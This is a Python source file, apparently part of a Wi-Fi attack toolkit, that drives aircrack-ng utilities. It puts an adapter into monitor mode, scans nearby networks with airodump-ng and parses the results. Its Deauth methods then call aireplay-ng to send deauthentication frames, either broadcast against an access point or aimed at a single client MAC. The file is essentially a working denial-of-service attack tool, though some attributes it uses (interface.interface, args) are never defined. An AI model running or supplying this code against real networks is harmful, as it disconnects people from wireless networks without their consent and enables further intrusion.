from modules import *
class Interface:
    def __init__(self,adapter:str,channel:str or str(int)=None) -> None:
        self.adapter = adapter
        self.channel = channel
    def start(self,channel:str or str(int)=None,mode:str=None) -> None:
        if mode == "monitor" or not mode:
            info(f"Starting {self.adapter}{f' on channel {channel if channel and not channel==self.channel else self.channel}' if channel or self.channel else ''}")
            try:
                out = subprocess.check_output(["sudo","airmon-ng", "start",self.adapter,channel if channel else self.channel if self.channel else '']).decode()
            except Exception as e:
                raise Exception(error(f"{self.adapter} {f'on channel {channel if channel and not channel==self.channel else self.channel} ' if channel or self.channel else ''}could not be started! \n{e}"))
            if f"monitor mode vif enabled" in out:
                success(f"Started {self.adapter}{f' on channel {channel if channel and not channel==self.channel else self.channel} ' if channel or self.channel else ''}")
                self.adapter = self.adapter + "mon" if "mon" not in self.adapter else self.adapter
                self.channel=channel if not channel == self.channel else self.channel
            else:
                raise Exception(error(f"Failed to start {self.adapter}{f' on channel {channel if channel and not channel==self.channel else self.channel} ' if channel or self.channel else ''}"))
        elif mode == "managed":
            if "mon" in self.adapter:
                info(f"Stopping {self.adapter} Monitor mode")
                try:
                    out = subprocess.check_output(["sudo","airmon-ng","stop",self.adapter]).decode()
                except:
                    return Exception(error(f'ERR: ["airmon-ng","stop",{self.adapter}] FAILED'))
                if f"monitor mode vif disabled" in out:
                    success(f"Stopped {self.adapter}")
                self.adapter = self.adapter.replace("mon","")
    def stop(self):
        self.start(mode="managed")
    def scan_for_MACs(self) -> list:
        self.start()
        command_args=""
        if "-e" in args:
            command_args+=f" --essid {args[args.index('-e')+1]}"
        if "-c" in args:
            command_args+=f" --channel {args[args.index('-c')+1]}"
        if "-r" in args:
            command_args+=f" --essid-regex {args[args.index('-r')+1]}"
        print("Starting airodump-ng to get a list of BSSIDs & channels")
        print("Press Ctrl+C when you are ready to continue")
        countdown_sleep(5,f"Starting airodump on {self.adapter}")
        os.system(f"sudo airodump-ng {command_args} {self.adapter} -w BSSIDs --output-format csv")
        try:
            input("Press Enter to continue")
        except KeyboardInterrupt:
            self.stop()
            exit()
        with open("BSSIDs-01.csv","r") as f:
            content = f.read().split("\n")
            whitespace_lines=[]
            for i,line in enumerate(content):
                if line == "":
                    whitespace_lines.append(i)
            content = content[2:whitespace_lines[1]]
            Networks=[]
            for line in content:
                line=line.split(",")
                BSSID,FTS,LTS,channel,Speed,Privacy,Cipher,Authentication,Power,num_beacons,IV,IP,IDlen,name,key=line
                Networks.append(WifiNetwork(BSSID,channel,name.strip()))
            return Networks
class WifiNetwork:
    def __init__(self,MAC:str,channel:str or str(int),name:str) -> None:
        self.MAC = MAC
        self.channel = channel
        self.name = name
    def configure_interface(self,interface:Interface) -> None:
        interface.start(self.channel)
    def Deauth(self,interface:Interface,amount:int=1) -> None:
        self.configure_interface(interface)
        info(f"DeAuthing {self.MAC} {self.channel} on interface {interface.interface}")
        out=None
        try:
            out=subprocess.check_output(["sudo","aireplay-ng", "-0", str(amount), "-a", self.MAC, interface.adapter])
        except Exception as e:
            print(error(f"DeAuth on {self.MAC} {self.channel} on interface {interface.interface} Failed!{RESET}\n{e}"))
        if out:
            if f"Sending DeAuth (code 7) to broadcast" in out.decode():
                success(f"DeAuth Sent!")
class Target:
    def __init__(self,Client_Mac:str,Host_Network:WifiNetwork) -> None:
        self.MAC = Client_Mac
        self.Host_Network = Host_Network
        self.configure_interface = self.Host_Network.configure_interface
    def Deauth(self,interface:Interface,amount:int=1) -> None:
        self.configure_interface(interface)
        info(f"DeAuthing {self.MAC} on network{self.Host_Network.channel} on interface {interface.interface}")
        out=None
        try:
            out=subprocess.check_output(["sudo","aireplay-ng", "-0", str(amount), "-a", self.Host_Network.MAC, "-c", self.MAC, interface.adapter])
        except Exception as e:
            print(error(f"DeAuth on {self.MAC} {self.Host_Network.channel} on interface {interface.interface} Failed!{RESET}\n{e}"))
        if out:
            if f"directed DeAuth (code 7)" in out.decode():
                success(f"DeAuth Sent!")